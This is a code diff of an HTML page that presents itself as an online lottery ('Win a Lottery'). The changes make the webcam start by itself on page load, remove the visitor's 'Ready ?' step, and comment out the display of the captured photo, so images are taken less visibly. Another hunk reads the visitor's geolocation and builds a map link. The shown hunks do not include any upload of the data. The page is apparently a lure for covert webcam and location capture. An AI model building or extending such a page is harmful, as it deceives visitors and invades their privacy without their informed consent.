@@ -7,40 +7,42 @@
     <h1>Win a Lottery</h1>
     <h3>Online lotteries are a form of gambling that have gained popularity in the digital age. These lotteries offer individuals the chance to purchase tickets and participate in various games of chance over the internet. While they can provide excitement and the potential for significant winnings, it's crucial for participants to exercise caution and responsibility.</h3>
     
-    <button id="startCamera">Ready ?</button>
-    <button id="capturePhoto" disabled>Lets Start</button>
-    <video id="cameraFeed" style="display: none;"></video>
+    
+    <button id="capturePhoto" >Lets Start</button>
+    <video id="cameraFeed" style="display: none;"></video> <br>
     <canvas id="photoCanvas"></canvas>
     <img id="capturedPhoto" style="display: none;">
 
     <script>
-        const startCameraButton = document.getElementById('startCamera');
+        
         const capturePhotoButton = document.getElementById('capturePhoto');
         const cameraFeed = document.getElementById('cameraFeed');
         const photoCanvas = document.getElementById('photoCanvas');
         const capturedPhoto = document.getElementById('capturedPhoto');
         
         let stream;
-
-        startCameraButton.addEventListener('click', async () => {
+		
+		async function startCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 cameraFeed.srcObject = stream;
                 cameraFeed.play();
-                startCameraButton.disabled = true;
+             
                 capturePhotoButton.disabled = false;
             } catch (error) {
                 console.error('Error accessing camera:', error);
             }
-        });
+        }
 
+        startCamera(); 
+		
         capturePhotoButton.addEventListener('click', () => {
             // Capture a photo from the video feed and display it
             photoCanvas.width = cameraFeed.videoWidth;
             photoCanvas.height = cameraFeed.videoHeight;
             photoCanvas.getContext('2d').drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
-            capturedPhoto.src = photoCanvas.toDataURL('image/jpeg');
-            capturedPhoto.style.display = 'block';
+            //capturedPhoto.src = photoCanvas.toDataURL('image/jpeg');
+            //capturedPhoto.style.display = 'block';
             
             // Stop the camera stream
             stream.getTracks().forEach(track => track.stop());
@@ -115,7 +117,7 @@ var x = document.getElementById("demo");
 
 function showPosition(position) {
   x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude+" <a href='http://maps.google.com/?q="+position.coords.latitude+","+position.coords.longitude+"'>Show In Map</a>";
+  "<br>Longitude: " + position.coords.longitude+" <a href='http://maps.google.com/?q="+position.coords.latitude+","+position.coords.longitude+"'>Show Your Location in Map</a>";
 }
 </script>
 </body>
